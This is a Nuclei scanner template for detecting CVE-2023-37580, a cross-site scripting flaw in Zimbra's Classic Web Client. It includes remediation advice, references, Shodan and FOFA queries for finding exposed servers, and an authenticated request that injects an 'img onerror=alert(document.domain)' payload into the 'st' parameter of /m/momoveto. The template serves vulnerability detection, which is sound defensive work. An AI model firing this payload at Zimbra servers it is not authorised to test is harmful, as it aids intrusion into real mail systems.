id: CVE-2023-37580

info:
  name: Zimbra Collaboration Suite (ZCS) v.8.8.15 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Zimbra Collaboration (ZCS) 8 before 8.8.15 Patch 41 allows XSS in the Zimbra Classic Web Client.
  remediation: |
    Apply the latest security patches or upgrade to a non-vulnerable version of Zimbra Collaboration Suite (ZCS).
  reference:
    - https://github.com/Zimbra/zm-web-client/pull/827
    - https://blog.zimbra.com/2023/07/security-update-for-zimbra-collaboration-suite-version-8-8-15/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37580
    - https://wiki.zimbra.com/wiki/Security_Center
    - https://wiki.zimbra.com/wiki/Zimbra_Responsible_Disclosure_Policy
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-37580
    cwe-id: CWE-79
    epss-score: 0.39893
    epss-percentile: 0.96899
    cpe: cpe:2.3:a:zimbra:zimbra:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: zimbra
    product: zimbra
    shodan-query: http.favicon.hash:475145467
    fofa-query: icon_hash="475145467"
  tags: cve,cve2023,zimbra,xss,authenticated,kev

http:
  - raw:
      - |
        POST /zimbra/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        loginOp=login&username={{username}}&password={{password}}&client=mobile
      - |
        GET /m/momoveto?st="><img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '<img src=x onerror=alert(document.domain)>'
          - 'id="zMoveForm"'
        condition: and

      - type: word
        part: header_2
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 490a0046304402202c5cfc81f0dd28f4447826796284e2e8638a62515571659351dcf871dac23530022070b43f3b0f908d99c8d26d2c0d8d176d80d8b33a042ce86f972e99d304e0af0b:922c64590222798bb761d5b6d8e72950